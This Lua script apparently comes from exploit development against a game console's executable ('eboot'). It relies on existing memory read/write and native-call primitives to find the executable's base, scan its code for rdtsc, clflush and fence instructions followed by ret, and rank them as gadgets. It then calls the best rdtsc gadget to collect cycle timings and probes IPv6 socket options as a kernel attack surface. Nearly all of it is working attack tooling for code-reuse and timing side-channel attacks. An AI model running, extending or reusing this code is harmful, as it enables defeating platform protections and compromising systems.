-- CRASH_CLASS: LOW
-- PROBE 1400a v5: Full eboot micro-arch gadget scan via dword reads
--
-- v3: dword scan 2MB = clean output, 24 rdtsc, 0 with immediate ret
-- v4: read_buffer scan = corrupted output (read_buffer poisons stdout)
-- v5: dword scan full 4.6MB, check ret within 20 bytes, all patterns

print("=== 1400a v5 ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local eboot_g = nil  -- global for read_byte
local function read_byte(offset)
    local aligned = offset - (offset % 4)
    local d = safe_rd(eboot_g + uint64(aligned))
    if not d then return nil end
    local shift = (offset % 4) * 8
    return math.floor(d / (2 ^ shift)) % 256
end

local function hex_bytes(offset, n)
    local parts = {}
    for i = 0, n - 1 do
        local b = read_byte(offset + i)
        parts[#parts + 1] = b and string.format("%02X", b) or "??"
    end
    return table.concat(parts, " ")
end

-- Get eboot
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
if not text_lo then print("FAIL") return end
eboot_g = uint64(string.format("0x%X%08X", text_hi or 0, text_lo))
print("eboot=" .. string.format("0x%X%08X", text_hi or 0, text_lo))

-- ============================================================
-- SCAN: full 4.6MB via dword reads
-- Track: rdtsc(0F31), 0FAE?? (clflush/lfence/mfence), rdtscp(0F01F9)
-- ============================================================
local LIMIT = 0x4A0000

local rdtsc = {}     -- offsets of 0F 31
local ofa_e = {}     -- offsets of 0F AE xx (will classify after)
local rdtscp = {}    -- offsets of 0F 01 F9

-- We track the last 3 bytes from previous dword for cross-boundary
local prev = {0, 0, 0}  -- prev[1]=b1, prev[2]=b2, prev[3]=b3 of previous dword

print("scanning " .. (LIMIT / 1024) .. "KB...")

for off = 0, LIMIT - 4, 4 do
    local d = safe_rd(eboot_g + uint64(off))
    if d then
        local b0 = d % 256
        local b1 = math.floor(d / 256) % 256
        local b2 = math.floor(d / 65536) % 256
        local b3 = math.floor(d / 16777216) % 256

        -- rdtsc: 0F 31
        if prev[3] == 0x0F and b0 == 0x31 then rdtsc[#rdtsc+1] = off - 1 end
        if b0 == 0x0F and b1 == 0x31 then rdtsc[#rdtsc+1] = off end
        if b1 == 0x0F and b2 == 0x31 then rdtsc[#rdtsc+1] = off + 1 end
        if b2 == 0x0F and b3 == 0x31 then rdtsc[#rdtsc+1] = off + 2 end

        -- 0F AE xx (clflush/lfence/mfence all start with 0F AE)
        if prev[2] == 0x0F and prev[3] == 0xAE then ofa_e[#ofa_e+1] = {off - 2, b0} end
        if prev[3] == 0x0F and b0 == 0xAE then ofa_e[#ofa_e+1] = {off - 1, b1} end
        if b0 == 0x0F and b1 == 0xAE then ofa_e[#ofa_e+1] = {off, b2} end
        if b1 == 0x0F and b2 == 0xAE then ofa_e[#ofa_e+1] = {off + 1, b3} end

        -- rdtscp: 0F 01 F9
        if prev[2] == 0x0F and prev[3] == 0x01 and b0 == 0xF9 then rdtscp[#rdtscp+1] = off - 2 end
        if prev[3] == 0x0F and b0 == 0x01 and b1 == 0xF9 then rdtscp[#rdtscp+1] = off - 1 end
        if b0 == 0x0F and b1 == 0x01 and b2 == 0xF9 then rdtscp[#rdtscp+1] = off end
        if b1 == 0x0F and b2 == 0x01 and b3 == 0xF9 then rdtscp[#rdtscp+1] = off + 1 end

        prev[1] = b1
        prev[2] = b2
        prev[3] = b3
    end

    if off > 0 and off % 0x100000 == 0 then
        print("  " .. (off / 0x100000) .. "MB")
    end
end

print("scan done")

-- ============================================================
-- Classify 0F AE hits
-- ============================================================
local lfence = {}
local mfence = {}
local clf = {rax={}, rcx={}, rdx={}, rbx={}, rsi={}, rdi={}}

for _, entry in ipairs(ofa_e) do
    local off = entry[1]
    local third = entry[2]
    if third == 0xE8 then lfence[#lfence+1] = off
    elseif third == 0xF0 then mfence[#mfence+1] = off
    elseif third == 0x38 then clf.rax[#clf.rax+1] = off
    elseif third == 0x39 then clf.rcx[#clf.rcx+1] = off
    elseif third == 0x3A then clf.rdx[#clf.rdx+1] = off
    elseif third == 0x3B then clf.rbx[#clf.rbx+1] = off
    elseif third == 0x3E then clf.rsi[#clf.rsi+1] = off
    elseif third == 0x3F then clf.rdi[#clf.rdi+1] = off
    end
end

-- ============================================================
-- RESULTS
-- ============================================================
print("")
print("rdtsc=" .. #rdtsc .. " rdtscp=" .. #rdtscp)
print("lfence=" .. #lfence .. " mfence=" .. #mfence)
local clf_total = #clf.rax + #clf.rcx + #clf.rdx + #clf.rbx + #clf.rsi + #clf.rdi
print("clflush=" .. clf_total .. " (rax=" .. #clf.rax .. " rcx=" .. #clf.rcx ..
    " rdx=" .. #clf.rdx .. " rsi=" .. #clf.rsi .. " rdi=" .. #clf.rdi .. ")")

-- ============================================================
-- RDTSC: find best (closest ret)
-- ============================================================
print("")
print("--- rdtsc ---")

local best_rdtsc = nil
local best_rdtsc_dist = 999

for i, off in ipairs(rdtsc) do
    -- Find C3 (ret) within +2 to +20 after rdtsc
    local ret_at = nil
    for j = 2, 20 do
        local b = read_byte(off + j)
        if b == 0xC3 then ret_at = j break end
    end

    if ret_at then
        print(string.format("  +0x%06X: %s  RET@+%d", off, hex_bytes(off, ret_at + 1), ret_at))
        if ret_at < best_rdtsc_dist then
            best_rdtsc = off
            best_rdtsc_dist = ret_at
        end
    elseif i <= 5 then
        print(string.format("  +0x%06X: %s  no-ret-20", off, hex_bytes(off, 12)))
    end
end

local no_ret = #rdtsc - (best_rdtsc and 1 or 0)
-- Count how many have ret
local with_ret = 0
for _, off in ipairs(rdtsc) do
    for j = 2, 20 do
        if read_byte(off + j) == 0xC3 then with_ret = with_ret + 1 break end
    end
end
print(string.format("  with_ret=%d no_ret=%d", with_ret, #rdtsc - with_ret))

-- ============================================================
-- CLFLUSH: find best
-- ============================================================
print("")
print("--- clflush ---")

local best_clf_off = nil
local best_clf_dist = 999
local best_clf_reg = nil

for reg, offsets in pairs(clf) do
    for _, off in ipairs(offsets) do
        for j = 3, 12 do
            if read_byte(off + j) == 0xC3 then
                local ctx = hex_bytes(off, j + 1)
                print(string.format("  %s +0x%06X: %s  RET@+%d", reg, off, ctx, j))
                if j < best_clf_dist then
                    best_clf_off = off
                    best_clf_dist = j
                    best_clf_reg = reg
                end
                break
            end
        end
    end
end

if not best_clf_off then
    print("  NONE with ret")
end

-- ============================================================
-- LFENCE/MFENCE detail
-- ============================================================
if #lfence > 0 then
    print("")
    print("--- lfence ---")
    for i, off in ipairs(lfence) do
        if i > 5 then break end
        print(string.format("  +0x%06X: %s", off, hex_bytes(off, 8)))
    end
end
if #mfence > 0 then
    print("")
    print("--- mfence ---")
    for i, off in ipairs(mfence) do
        if i > 5 then break end
        print(string.format("  +0x%06X: %s", off, hex_bytes(off, 8)))
    end
end

-- ============================================================
-- RDTSCP detail
-- ============================================================
if #rdtscp > 0 then
    print("")
    print("--- rdtscp ---")
    for i, off in ipairs(rdtscp) do
        if i > 5 then break end
        local ret_at = nil
        for j = 3, 20 do
            if read_byte(off + j) == 0xC3 then ret_at = j break end
        end
        local n = ret_at and (ret_at + 1) or 12
        local note = ret_at and string.format("  RET@+%d", ret_at) or "  no-ret"
        print(string.format("  +0x%06X: %s%s", off, hex_bytes(off, n), note))
    end
end

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print("=== BEST GADGETS ===")
if best_rdtsc then
    print(string.format("rdtsc: eboot+0x%06X ret@+%d", best_rdtsc, best_rdtsc_dist))
else
    print("rdtsc: NONE usable")
end
if best_clf_off then
    print(string.format("clflush: %s eboot+0x%06X ret@+%d", best_clf_reg, best_clf_off, best_clf_dist))
else
    print("clflush: NONE usable")
end

-- ============================================================
-- TEST rdtsc gadget
-- ============================================================
print("")
print("=== RDTSC TEST ===")
if best_rdtsc then
    local addr = eboot_g + uint64(best_rdtsc)
    if type(native) == "table" then
        local keys = {}
        for k, _ in pairs(native) do keys[#keys+1] = tostring(k) end
        print("native keys: " .. table.concat(keys, ", "))

        if type(native.fcall_with_rax) == "function" then
            local vals = {}
            for i = 1, 8 do
                local ok, v = pcall(function() return native.fcall_with_rax(addr) end)
                if ok and v then vals[#vals+1] = v
                else print("fail " .. i .. ": " .. tostring(v)) break end
            end
            if #vals >= 2 then
                print("WORKS: " .. #vals .. " readings")
                for i = 1, math.min(3, #vals) do
                    local h, l = get_hi_lo(vals[i])
                    print(string.format("  [%d] 0x%X%08X", i, h, l))
                end
                for i = 2, math.min(5, #vals) do
                    local _, l1 = get_hi_lo(vals[i-1])
                    local _, l2 = get_hi_lo(vals[i])
                    local d = l2 - l1
                    if d < 0 then d = d + 0x100000000 end
                    print(string.format("  delta %d: %d cyc", i, d))
                end
            end
        else
            print("no fcall_with_rax")
        end
    else
        print("no native table")
    end
else
    print("no gadget")
end

-- ============================================================
-- IPv6 PKTOPTIONS
-- ============================================================
print("")
print("=== IPv6 PKTOPTIONS ===")
local sc_socket = make_syscall(97)
local sc_getsockopt = make_syscall(118)
local sc_close = make_syscall(6)

local sock = nil
do
    local ok, v = pcall(function() return sc_socket(uint64(28), uint64(2), uint64(17)) end)
    if ok then
        local h, l = get_hi_lo(v)
        if h == 0 and l < 0xFFFF then sock = l end
    end
end

if sock then
    print("udp6 fd=" .. sock)
    local outbuf = memory.alloc(0x400)
    local outlen = memory.alloc(8)
    for _, opt in ipairs({25, 36, 44, 50, 61}) do
        for i = 0, 0x3FC, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end
        safe_wd(outlen, 0x400)
        local ok, v = pcall(function()
            return sc_getsockopt(uint64(sock), uint64(41), uint64(opt),
                uint64(outbuf), uint64(outlen))
        end)
        if ok then
            local _, rl = get_hi_lo(v)
            local rlen = safe_rd(outlen) or 0
            print(string.format("  opt=%d ret=%d len=%d", opt, rl, rlen))
        else
            print(string.format("  opt=%d FAIL", opt))
        end
    end
    pcall(function() sc_close(uint64(sock)) end)
else
    print("no ipv6 socket")
end

print("")
print("=== 1400a DONE ===")
